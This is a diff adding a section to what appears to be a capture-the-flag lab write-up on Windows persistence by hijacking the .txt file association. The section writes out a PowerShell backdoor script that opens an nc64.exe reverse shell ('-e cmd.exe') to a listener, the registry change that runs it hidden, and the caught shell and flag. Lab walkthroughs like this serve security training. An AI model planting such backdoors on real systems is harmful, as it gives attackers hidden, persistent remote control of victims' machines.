@@ -60,4 +60,75 @@ THM{NO_SHORTCUTS_IN_LIFE}
 
 # Hijacking File Associations
 1. Started this room's machine
-2. 
+2. `regedit`
+```PowerShell
+C:\Users\Administrator>regedit
+```
+
+![]()
+
+![]()
+
+![]()
+
+![]()
+
+3. `PowerShell`
+```PowerShell
+C:\Users\Administrator>PowerShell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator>
+```
+4. `$scriptPath = 'C:\Windows\System32\<SCRIPT NAME>.ps1'`
+5. `$scriptContent = @"`
+6. `Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <MACHINE IP> <PORT NUMBER>"`
+7. `C:\Windows\system32\NOTEPAD.EXE $args[0]`
+8. `"@` 
+9. `Set-Content -Path $scriptPath -Value $scriptContent`
+```PowerShell
+PS C:\Users\Administrator> $scriptPath = 'C:\Windows\System32\BackdoorScript.ps1'
+>> $scriptContent = @"
+>> Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe 10.10.173.81 9999"
+>> C:\Windows\system32\NOTEPAD.EXE $args[0]
+>> "@
+>> Set-Content -Path $scriptPath -Value $scriptContent
+PS C:\Users\Administrator>
+```
+10. Change value data to `powershell.exe -WindowStyle hidden C:\Windows\System32\<SCRIPT FILE>.ps1 %1`
+
+![]()
+
+![]()
+
+![]()
+
+11. `nc -lvnp <PORT NUMBER>`
+```Bash
+root@ip-10-10-173-81:~# nc -lvnp 9999
+Listening on [0.0.0.0] (family 0, port 9999)
+```
+
+12. Open any text file
+
+![]()
+
+```Bash
+root@ip-10-10-173-81:~# nc -lvnp 9999
+Listening on [0.0.0.0] (family 0, port 9999)
+Connection from 10.10.141.70 49905 received!
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator\Desktop>
+```
+13. `C:\flags\flag6.exe`
+```PowerShell
+C:\Users\Administrator\Desktop>C:\flags\flag6.exe
+C:\flags\flag6.exe
+THM{TXT_FILES_WOULD_NEVER_HURT_YOU}
+```
+
+
+**TASK COMPLETED**
